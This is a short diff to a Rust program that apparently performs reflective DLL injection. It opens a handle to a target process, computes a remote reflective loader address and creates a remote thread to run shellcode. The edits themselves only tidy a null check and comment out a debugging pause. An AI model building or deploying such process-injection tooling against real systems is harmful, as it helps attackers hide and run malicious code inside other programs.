@@ -34,7 +34,7 @@ fn main() {
         )
     };
 
-    if process_handle == null_mut() {
+    if process_handle.is_null() {
         panic!("Failed to open a handle to the target process");
     }
 
@@ -74,7 +74,7 @@ fn main() {
 
     let reflective_loader = remote_image as usize + (loader_address as usize - module_base); // module_base minus to get the offset
     log::info!("[+] Remote Reflective Loader Address/offset: {:#x}", reflective_loader);
-    pause();
+    //pause();
 
     // Create remote thread and execute our shellcode
     let thread_handle = unsafe { 
